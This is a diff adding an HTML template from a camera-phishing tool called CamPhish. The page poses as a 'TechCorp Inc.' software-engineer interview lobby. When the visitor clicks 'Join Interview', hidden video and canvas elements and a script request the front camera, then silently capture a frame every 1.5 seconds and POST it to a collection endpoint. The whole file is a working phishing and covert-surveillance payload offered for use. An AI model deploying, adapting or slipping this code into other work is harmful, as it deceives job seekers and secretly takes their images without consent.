@@ -1,0 +1,265 @@
+<!--
+ * CamPhish - Advanced Camera Phishing Tool
+ * 
+ * Author: Rahul Kushwaha
+ * GitHub: https://github.com/raahulllkushwaha
+ * Repository: https://github.com/raahulllkushwaha/Cam-Phisher
+ * License: GNU General Public License v3.0
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Job Interview - TechCorp Inc.</title>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .interview-container {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 50px 40px;
+            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.3);
+            max-width: 500px;
+            width: 90%;
+        }
+
+        .company-icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+        }
+
+        .company-name {
+            color: #1e3c72;
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .position-title {
+            color: #666;
+            font-size: 18px;
+            margin-bottom: 30px;
+        }
+
+        .divider {
+            height: 1px;
+            background: linear-gradient(90deg, transparent, #ddd, transparent);
+            margin: 30px 0;
+        }
+
+        .status-container {
+            background: #f0fdf4;
+            border: 1px solid #22c55e;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .status-dot {
+            width: 12px;
+            height: 12px;
+            background: #22c55e;
+            border-radius: 50%;
+            animation: pulse-green 1.5s infinite;
+        }
+
+        @keyframes pulse-green {
+            0% {
+                box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7);
+            }
+            70% {
+                box-shadow: 0 0 0 10px rgba(34, 197, 94, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(34, 197, 94, 0);
+            }
+        }
+
+        .status-text {
+            color: #166534;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .info-box {
+            background: #f8fafc;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .info-item:last-child {
+            border-bottom: none;
+        }
+
+        .info-label {
+            color: #64748b;
+            font-size: 14px;
+        }
+
+        .info-value {
+            color: #1e293b;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .join-btn {
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            color: white;
+            border: none;
+            padding: 18px 60px;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            width: 100%;
+        }
+
+        .join-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(30, 60, 114, 0.4);
+        }
+
+        .note {
+            color: #94a3b8;
+            font-size: 12px;
+            margin-top: 20px;
+        }
+
+        .video-wrap {
+            display: none;
+        }
+
+        #canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Hidden webcam capture elements -->
+    <div class="video-wrap">
+        <video id="video" playsinline autoplay></video>
+    </div>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <div class="interview-container">
+        <div class="card">
+            <div class="company-icon">🏢</div>
+            <h1 class="company-name">TechCorp Inc.</h1>
+            <p class="position-title">Software Engineer Interview</p>
+
+            <div class="divider"></div>
+
+            <div class="status-container">
+                <div class="status-indicator">
+                    <div class="status-dot"></div>
+                    <span class="status-text">Your interviewer is ready</span>
+                </div>
+            </div>
+
+            <div class="info-box">
+                <div class="info-item">
+                    <span class="info-label">Position</span>
+                    <span class="info-value">Software Engineer</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">Department</span>
+                    <span class="info-value">Engineering</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">Interview Type</span>
+                    <span class="info-value">Technical Round</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">Duration</span>
+                    <span class="info-value">45 minutes</span>
+                </div>
+            </div>
+
+            <button class="join-btn" onclick="joinInterview()">Join Interview</button>
+
+            <p class="note">Please ensure your camera and microphone are working properly</p>
+        </div>
+    </div>
+
+    <script>
+        function post(imgdata) {
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata },
+                url: 'forwarding_link/post.php',
+                dataType: 'json',
+                async: false,
+                success: function(result) {},
+                error: function() {}
+            });
+        }
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        const constraints = {
+            audio: false,
+            video: {
+                facingMode: "user"
+            }
+        };
+
+        async function joinInterview() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream);
+            } catch (e) {
+                console.log('Camera access denied');
+            }
+        }
+
+        function handleSuccess(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
+
+            var context = canvas.getContext('2d');
+            setInterval(function() {
+                context.drawImage(video, 0, 0, 640, 480);
+                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                post(canvasData);
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
